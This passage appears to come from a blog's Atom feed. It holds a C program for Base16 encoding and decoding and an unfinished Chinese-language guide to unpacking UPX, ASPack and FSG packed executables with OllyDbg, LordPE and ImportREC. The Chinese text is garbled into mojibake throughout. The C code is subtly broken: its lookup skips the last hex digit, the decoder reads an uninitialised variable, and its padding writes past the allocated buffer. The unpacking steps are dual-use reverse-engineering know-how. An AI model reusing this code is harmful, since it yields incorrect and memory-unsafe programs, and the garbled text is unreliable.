id="Base16åŠ è§£å¯†å®ç°"><a href="#Base16åŠ è§£å¯†å®ç°" class="headerlink" title="Base16åŠ è§£å¯†å®ç°"></a>Base16åŠ è§£å¯†å®ç°</h1><p>Base16ç¼–ç ä½¿ç”¨16ä¸ªASCIIå¯æ‰“å°å­—ç¬¦ï¼ˆæ•°å­—0-9å’Œå­—æ¯A-Fï¼‰å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç ã€‚Base16å…ˆè·å–è¾“å…¥å­—ç¬¦ä¸²æ¯ä¸ªå­—èŠ‚çš„äºŒè¿›åˆ¶å€¼ï¼ˆä¸è¶³8æ¯”ç‰¹åœ¨é«˜ä½è¡¥0ï¼‰ï¼Œç„¶åå°†å…¶ä¸²è”è¿›æ¥ï¼Œå†æŒ‰ç…§4æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œå°†æ¯ç»„äºŒè¿›åˆ¶æ•°åˆ†åˆ«è½¬æ¢æˆåè¿›åˆ¶ï¼Œåœ¨ä¸‹è¿°è¡¨æ ¼ä¸­æ‰¾åˆ°å¯¹åº”çš„ç¼–ç ä¸²æ¥èµ·æ¥å°±æ˜¯Base16ç¼–ç ã€‚å¯ä»¥çœ‹åˆ°8æ¯”ç‰¹æ•°æ®æŒ‰ç…§4æ¯”ç‰¹åˆ‡åˆ†åˆšå¥½æ˜¯ä¸¤ç»„ï¼Œæ‰€ä»¥Base16ä¸å¯èƒ½ç”¨åˆ°å¡«å……ç¬¦å·â€œ=â€ã€‚</p><p>ç®€å•æ¥è¯´ï¼ŒBase16ç¼–ç æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *base16payload = <span class="string">"0123456789ABCDEF="</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == base16payload[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base16_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sign = len % <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i + <span class="number">4</span> &gt;= len) &#123;</span><br><span class="line">            res[j] = (s[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">            <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = s[i + <span class="number">2</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[j] = (s[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">5</span>] = s[i + <span class="number">2</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">6</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">7</span>] = s[i + <span class="number">3</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; res_len; j++) &#123;</span><br><span class="line">        res[j] = base16payload[res[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base16_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> count = len / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> s_index = i * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">int</span> res_index = i * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> buffer[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            buffer[j] = find_pos(s[s_index + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sign;</span><br><span class="line">        <span class="keyword">if</span>(i == count - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(buffer[j] == <span class="number">0x10</span>) &#123;</span><br><span class="line">                    sign++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index] = ((buffer[<span class="number">0</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">1</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">1</span>] = ((buffer[<span class="number">2</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">3</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">2</span>] = ((buffer[<span class="number">4</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">5</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">3</span>] = ((buffer[<span class="number">6</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">7</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s1[MAX];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s2 = base16_encode((<span class="keyword">const</span> <span class="keyword">char</span> *)s1, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s3 = base16_decode((<span class="keyword">const</span> <span class="keyword">char</span> *)s2, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s3);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‰¿æ¥ä¹‹å‰&lt;a href=&quot;https://qianfei11.github.io/2018/05/12/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0base64%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/&quot;&gt;Base64çš„æ–‡ç« &lt;/a&gt;ï¼Œå®ç°äº†ä¸€ä¸‹Base32å’ŒBase16ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="c" scheme="https://qianfei11.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>è„±å£³æŒ‡å—</title>
    <link href="https://qianfei11.github.io/2018/11/29/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91%E8%84%B1%E5%A3%B3%E6%8C%87%E5%8D%97/"/>
    <id>https://qianfei11.github.io/2018/11/29/ã€æœªå®Œæˆã€‘è„±å£³æŒ‡å—/</id>
    <published>2018-11-29T09:04:10.000Z</published>
    <updated>2019-02-18T09:09:41.427Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹è„±ä¸€äº›ç®€å•å£³çš„è¿‡ç¨‹ï¼ˆä¸»è¦æ˜¯æ‰¾OEPï¼‰ã€‚</p><a id="more"></a><h1 id="ä½¿ç”¨å·¥å…·"><a href="#ä½¿ç”¨å·¥å…·" class="headerlink" title="ä½¿ç”¨å·¥å…·"></a>ä½¿ç”¨å·¥å…·</h1><ul><li>è°ƒè¯•å·¥å…·ï¼š<code>Ollydbg</code></li><li>æŸ¥å£³å·¥å…·ï¼š<code>ExeInfo</code>/<code>PEID</code></li><li>è„±å£³å·¥å…·ï¼š<code>LordPE</code>ã€<code>ImportRE</code></li></ul><p>ODå¿«æ·é”®ï¼š</p><table><thead><tr><th style="text-align:center">å¿«æ·é”®</th><th style="text-align:center">åŠŸèƒ½</th></tr></thead><tbody><tr><td style="text-align:center"><code>f7</code></td><td style="text-align:center">å•æ­¥æ­¥å…¥</td></tr><tr><td style="text-align:center"><code>f8</code></td><td style="text-align:center">å•æ­¥æ­¥è¿‡</td></tr><tr><td style="text-align:center"><code>f4</code></td><td style="text-align:center">è¿è¡Œåˆ°é€‰å®šä½ç½®</td></tr><tr><td style="text-align:center"><code>f2</code></td><td style="text-align:center">è®¾ç½®æ–­ç‚¹</td></tr><tr><td style="text-align:center"><code>ctrl+f2</code></td><td style="text-align:center">é‡æ–°å¼€å§‹</td></tr><tr><td style="text-align:center"><code>f9</code></td><td style="text-align:center">è¿è¡Œ</td></tr><tr><td style="text-align:center"><code>shift+f9</code></td><td style="text-align:center">å¿½ç•¥å¼‚å¸¸è¿è¡Œ</td></tr><tr><td style="text-align:center"><code>alt+f9</code></td><td style="text-align:center">æ‰§è¡Œåˆ°ç”¨æˆ·ä»£ç </td></tr></tbody></table><h1 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h1><h2 id="LordPE"><a href="#LordPE" class="headerlink" title="LordPE"></a>LordPE</h2><p>LordPEç”¨æ¥å°†ç¨‹åºdumpå‡ºæ¥ï¼š</p><ol><li>æ‰¾åˆ°ç¨‹åºå³é”®ï¼Œ<code>ä¿®æ­£é•œåƒå¤§å°</code>ï¼›</li><li><code>å®Œæ•´è½¬å­˜</code>ã€‚</li></ol><p><img src="/pics/è„±å£³æŒ‡å—/1.png" alt="LordPEæ­¥éª¤"></p><h2 id="ImportREC"><a href="#ImportREC" class="headerlink" title="ImportREC"></a>ImportREC</h2><p>ImportRECç”¨æ¥ä¿®æ”¹OEPå’Œä¸€äº›IATï¼š</p><ol><li>æ‰¾åˆ°ç¨‹åºï¼Œè¾“å…¥æ‰¾åˆ°çš„<code>OEP</code>çš„å€¼ï¼›</li><li>ç‚¹å‡»<code>IATè‡ªåŠ¨æœç´¢</code>ï¼›</li><li><code>è·å–å¯¼å…¥è¡¨</code>ï¼›</li><li><code>æ˜¾ç¤ºæ— æ•ˆçš„</code>ï¼Œå¦‚æœæœ‰æ— æ•ˆçš„è¡¨æ¸…é™¤å³å¯ï¼›</li><li><code>ä¿®æ­£è½¬å‚¨</code>ã€‚</li></ol><p><img src="/pics/è„±å£³æŒ‡å—/2.png" alt="ImportRECæ­¥éª¤"></p><p>äº†è§£äº†è„±å£³çš„æ–¹æ³•åï¼Œæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°OEPã€‚</p><h1 id="å‹ç¼©å£³"><a href="#å‹ç¼©å£³" class="headerlink" title="å‹ç¼©å£³"></a>å‹ç¼©å£³</h1><p>å‹ç¼©å£³çš„ç‰¹ç‚¹æ˜¯å‡å°è½¯ä»¶ä½“ç§¯å¤§å°ï¼Œä¸»è¦ç›®çš„èµ·å¯¹è½¯ä»¶çš„å‹ç¼©ï¼ŒåŠ å¯†ä¿æŠ¤ä¸æ˜¯é‡ç‚¹ã€‚ä¾‹å¦‚ï¼šUPXã€ASPackç­‰ç­‰ã€‚</p><ul><li><code>UPX</code>ï¼ˆthe Ultimate Packer for eXecutablesï¼‰æ˜¯ä¸€ä¸ªå…è´¹ä¸”å¼€æºçš„å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶åŠ å£³å™¨ï¼Œæ”¯æŒè®¸å¤šä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ã€‚</li><li><code>ASPack</code>æ˜¯ä¸€ç§å¯å‹ç¼©32ä½Windows<code>EXE</code>æ–‡ä»¶ä¸<code>DLL</code>æ–‡ä»¶çš„å‹ç¼©å·¥å…·ï¼Œèƒ½å°†å¤§å¤šæ•°EXEæ–‡ä»¶åŠDLLæ–‡ä»¶å¹³å‡å‹ç¼©ç™¾åˆ†ä¹‹ä¸‰ååˆ°å››åçš„å‹ç¼©ç‡ã€‚</li><li><code>kkrunchy</code>æ˜¯ä¸€ä¸ª<code>64K Demo</code>ä¸“ç”¨çš„å‹ç¼©å·¥å…·ï¼Œå‹ç¼©ç‡éå¸¸é«˜ã€‚</li><li><code>NSPack</code>æ˜¯ä¸€æ¬¾æ”¯æŒ<code>EXE</code>/<code>DLL</code>/<code>OCX</code>/<code>SCR</code>ç­‰ç±»å‹çš„æ–‡ä»¶è¿›è¡Œå‹ç¼©ã€‚å¯ä»¥å…¼å®¹64ä½æ“ä½œç³»ç»Ÿã€‚</li><li><code>PECompact</code>æ˜¯ä¸€æ¬¾èƒ½å‹ç¼©å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆåç¼€ä¸º<code>EXE</code>ï¼‰çš„å‹ç¼©åŠ å£³å·¥å…·ï¼Œå‹ç¼©ç‡æé«˜ï¼Œå‹ç¼©åçš„ç¨‹åºæ— éœ€è§£å‹å³å¯ç›´æ¥è¿è¡Œï¼Œé€šè¿‡å‹ç¼©ä»£ç ã€æ•°æ®ã€ç›¸å…³èµ„æºä½¿å‹ç¼©èƒ½è¾¾åˆ°100%ã€‚</li></ul><h2 id="å•æ­¥æ‰§è¡Œæ³•"><a href="#å•æ­¥æ‰§è¡Œæ³•" class="headerlink" title="å•æ­¥æ‰§è¡Œæ³•"></a>å•æ­¥æ‰§è¡Œæ³•</h2><p>ä»¥UPXä¸ºä¾‹ã€‚å•æ­¥æ‰§è¡Œæ³•ï¼Œé€šè¿‡å•æ­¥æ‰§è¡Œä¸€æ­¥ä¸€æ­¥ï¼Œæ‰¾åˆ°OEPï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰ã€‚å¦‚æœé‡åˆ°å‘ä¸‹çš„è·³è½¬åˆ™é»˜è®¤è·³è½¬ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/3.png" alt="å‘ä¸‹è·³è½¬f7å®ç°"></p><p>é‡åˆ°å‘ä¸Šçš„è·³è½¬åˆ™ç›´æ¥æ‰§è¡Œåˆ°ä¸‹ä¸€æ¡è¯­å¥ï¼Œå³f4ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/4.png" alt="å‘ä¸Šè·³è½¬"></p><p><img src="/pics/è„±å£³æŒ‡å—/5.png" alt="f4åˆ°ä¸‹ä¸€æ¡è¯­å¥"></p><p>æœ€åæ‰§è¡Œåˆ°<code>popad</code>å¤„ä¼šæœ‰ä¸€ä¸ªå¤§èŒƒå›´çš„<code>jmp</code>ï¼Œå³è½¬åˆ°OEPã€‚</p><h2 id="ESPå®šå¾‹æ³•"><a href="#ESPå®šå¾‹æ³•" class="headerlink" title="ESPå®šå¾‹æ³•"></a>ESPå®šå¾‹æ³•</h2><p>ä»¥UPXä¸ºä¾‹ã€‚åˆ©ç”¨å‹ç¼©å‰åESPä¸å˜çš„å®šå¾‹ã€‚åœ¨æŒ‡ä»¤<code>pushad</code>æ—¶å•æ­¥ä¸€ä¸‹ï¼Œä¼šå‘ç°å¯„å­˜å™¨ä¸­åªæœ‰<code>ESP</code>å‘ç”Ÿå˜åŒ–ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/6.png" alt="åªæœ‰ESPçš„å€¼å‘ç”Ÿæ”¹å˜"></p><p>ç„¶åå³é”®ESPçš„å€¼ï¼Œè·Ÿéšæ•°æ®çª—å£ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/7.png" alt="è·Ÿéšæ•°æ®çª—å£"></p><p>å†åœ¨æ•°æ®çª—å£ä¸­ç¡¬ä»¶è®¿é—®ï¼Œè®¾ä¸‹æ–­ç‚¹ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/8.png" alt="è®¾ç½®ç¡¬ä»¶æ–­ç‚¹"></p><p>åŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡<code>dd xxxxxxxx</code>æˆ–è€…<code>hr xxxxxxxx</code>è®¾ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼Œåœ¨ä¸‹æ–¹commandå¤„è¾“å…¥ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/9.png" alt="ddå‘½ä»¤"></p><p><img src="/pics/è„±å£³æŒ‡å—/10.png" alt="hrå‘½ä»¤"></p><p>ç„¶åf9ç»§ç»­æ‰§è¡Œåˆ°<code>popad</code>åï¼Œåˆ å»ç¡¬ä»¶æ–­ç‚¹ï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/11.png" alt="åˆ é™¤ç¡¬ä»¶æ–­ç‚¹"></p><p>f7åˆ°è¾¾OEPã€‚</p><h2 id="ç‰¹æ®Šçš„ESPå®šå¾‹æ³•"><a href="#ç‰¹æ®Šçš„ESPå®šå¾‹æ³•" class="headerlink" title="ç‰¹æ®Šçš„ESPå®šå¾‹æ³•"></a>ç‰¹æ®Šçš„ESPå®šå¾‹æ³•</h2><p>ä»¥FSG2.0ä¸ºä¾‹ã€‚ä¸éµå¾ªESPä¸å˜çš„å®šå¾‹ï¼ŒFSG2.0ä¸“ç”¨çš„æ–¹æ³•ã€‚å•æ­¥èµ°åˆ°<code>popad</code>çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè§‚å¯Ÿå †æ ˆçª—å£ä»ä¸Šå¾€ä¸‹æ•°ç¬¬å››ä¸ªåœ°å€çš„å€¼å³ä¸ºOEPçš„åœ°å€ã€‚å³é”®åœ¨åæ±‡ç¼–çª—å£è·Ÿéšï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/26.png" alt="ç¬¬å››ä¸ªå€¼åœ¨åæ±‡ç¼–çª—å£è·Ÿéš"></p><p>ä¸‹ç¡¬ä»¶æ–­ç‚¹åf9è¿è¡Œï¼Œåˆ°è¾¾OEPã€‚</p><h2 id="äºŒæ¬¡å†…å­˜é•œåƒæ³•"><a href="#äºŒæ¬¡å†…å­˜é•œåƒæ³•" class="headerlink" title="äºŒæ¬¡å†…å­˜é•œåƒæ³•"></a>äºŒæ¬¡å†…å­˜é•œåƒæ³•</h2><p>ä»¥UPXä¸ºä¾‹ã€‚è¿›å…¥å†…å­˜æ®µä¸­ï¼Œå…ˆæ‰¾åˆ°ç¨‹åºæ®µçš„ç¬¬ä¸€ä¸ª<code>.rsrc</code>ï¼Œå¹¶è®¾ä¸‹æ–­ç‚¹åæ‰§è¡Œï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/12.png" alt="ç¨‹åºæ®µç¬¬ä¸€ä¸ª.rsrc"></p><p>å†åœ¨å†…å­˜æ®µä¸­çš„<code>0x00401000</code>å¤„è®¾ä¸‹æ–­ç‚¹ï¼Œå†æ‰§è¡Œ</p><p><img src="/pics/è„±å£³æŒ‡å—/13.png" alt="0x00401000å¤„"></p><p>ç„¶åæŒ‰ç…§å•æ­¥æ‰§è¡Œæ³•å¾€ä¸‹èµ°å°±èƒ½çœ‹åˆ°<code>popad</code>è¿˜æœ‰jmpï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/14.png" alt="çœ‹åˆ°popad"></p><h2 id="ä¸€æ­¥ç›´è¾¾æ³•"><a href="#ä¸€æ­¥ç›´è¾¾æ³•" class="headerlink" title="ä¸€æ­¥ç›´è¾¾æ³•"></a>ä¸€æ­¥ç›´è¾¾æ³•</h2><p>ä»¥UPXä¸ºä¾‹ã€‚åœ¨é‡åˆ°æŒ‡ä»¤<code>pushad</code>åï¼Œé€šè¿‡ç»éªŒå¯ä»¥åˆ¤æ–­å¿…å­˜åœ¨<code>popad</code>ï¼Œç›´æ¥æœç´¢æŒ‡ä»¤æ‰¾åˆ°OEPï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/15.png" alt="æœç´¢æŒ‡ä»¤"></p><p><img src="/pics/è„±å£³æŒ‡å—/16.png" alt="ä¸éœ€è¦é€‰æ•´ä¸ªå—"></p><h2 id="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"><a href="#æ¨¡æ‹Ÿè·Ÿè¸ªæ³•" class="headerlink" title="æ¨¡æ‹Ÿè·Ÿè¸ªæ³•"></a>æ¨¡æ‹Ÿè·Ÿè¸ªæ³•</h2><p>ä»¥ASPackä¸ºä¾‹ã€‚å…ˆè¿›å…¥å†…å­˜ä¸­ï¼Œæ‰¾åˆ°SFXï¼š</p><p><img src="/pics/è„±å£³æŒ‡å—/17.png" 